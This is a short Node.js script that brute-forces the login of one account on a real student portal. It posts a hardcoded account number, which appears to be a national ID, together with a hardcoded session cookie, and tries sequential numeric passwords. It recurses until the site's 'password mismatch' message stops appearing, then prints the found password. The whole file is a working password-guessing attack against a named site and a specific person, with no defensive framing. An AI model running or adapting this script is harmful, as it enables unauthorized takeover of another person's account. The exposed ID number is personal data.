var request = require('request');
//440921199610074511
var password = 74450;

function hack() {
    request.post({
        url: 'http://stu.1000phone.net/student.php/Public/login',
        formData: {
            'Account': '440921199610074511',
            'PassWord': '0' + (password)
        },
        headers: {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Length': 42,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': 'PHPSESSID=lte371hpprs8mqcuigr91kje30',
            'Host': 'stu.1000phone.net',
            'Origin': 'http://stu.1000phone.net',
            'Pragma': 'no-cache',
            'Referer': 'http://stu.1000phone.net/student.php/Public/login',
            'Upgrade-Insecure-Requests': 1,
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3573.0 Safari/537.36'
        }
    }, function (err, httpResponse, body) {
        if (err) {
            return console.error('upload failed:', err);
        }
        //console.log('Upload successful!  Server responded with:', body);
        if (body.indexOf('账号与密码不匹配') > 0) {
            console.log('密码错误', '0' + (password))
            password++;
            hack();
        } else {
            console.log('密码正确', '0' + (password))
            return;
            
        }
    });
}
hack();